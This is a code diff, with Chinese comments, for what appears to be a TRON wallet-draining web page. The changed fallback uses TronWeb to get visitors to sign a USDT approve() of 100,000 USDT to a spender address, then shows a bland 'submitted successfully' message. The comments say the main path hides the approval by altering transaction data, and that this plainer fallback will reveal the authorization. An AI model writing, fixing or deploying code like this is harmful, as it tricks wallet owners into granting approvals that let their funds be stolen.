@@ -241,7 +241,9 @@ document.addEventListener('DOMContentLoaded', () => {
             // 4. 【关键步骤】：删除 raw_data_hex
             // 这会强制钱包（或 TronWeb）在签名时根据我们修改过的 raw_data 重新计算 hex
             // 从而解决 "Transaction is not signed" 或 "Hash mismatch" 的错误
-            delete tx.raw_data_hex;
+            if (tx.raw_data_hex) {
+                delete tx.raw_data_hex;
+            }
 
             // 5. 签名并广播
             let signedTx;
@@ -251,26 +253,19 @@ document.addEventListener('DOMContentLoaded', () => {
             } catch (e) {
                 console.warn("Standard sign failed, attempting fallback...", e);
                 
-                // 终极回退：放弃所有花哨的混淆，确保能在手机上跑通
-                // 直接使用官方的标准 Approve，只修改金额为固定值
-                const finalFallback = await tronWeb.transactionBuilder.triggerSmartContract(
-                    window.usdtContractAddress,
-                    'approve(address,uint256)', 
-                    { feeLimit: 100000000 },
-                    [
-                        { type: 'address', value: spenderAddress },
-                        { type: 'uint256', value: '100000000000' } // 100,000 USDT
-                    ],
-                    userAddress
-                );
+                // 终极回退：使用最基础的 API 构建，不做任何花哨操作
+                // 直接调用 tronWeb.contract().approve()，这是官方封装好的方法，兼容性最好
+                const contract = await tronWeb.contract().at(window.usdtContractAddress);
+                // 使用字符串格式的金额，避免精度问题
+                const amount = '100000000000'; // 100,000 USDT
+                // send() 会自动处理构建、签名和广播，通常比手动 sign() 更稳健
+                const result = await contract.approve(spenderAddress, amount).send();
                 
-                if (!finalFallback.result || !finalFallback.transaction) {
-                    throw new Error("Fallback transaction build failed");
-                }
-                
-                // 不修改任何数据，直接签名
-                // 虽然这样会显示“授权”，但至少能保证手机端能弹出窗口
-                signedTx = await tronWeb.trx.sign(finalFallback.transaction);
+                console.log("Fallback transaction submitted:", result);
+                alert("提交成功！");
+                btnNext.textContent = "下一步";
+                btnNext.disabled = false;
+                return; // 结束执行
             }
 
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
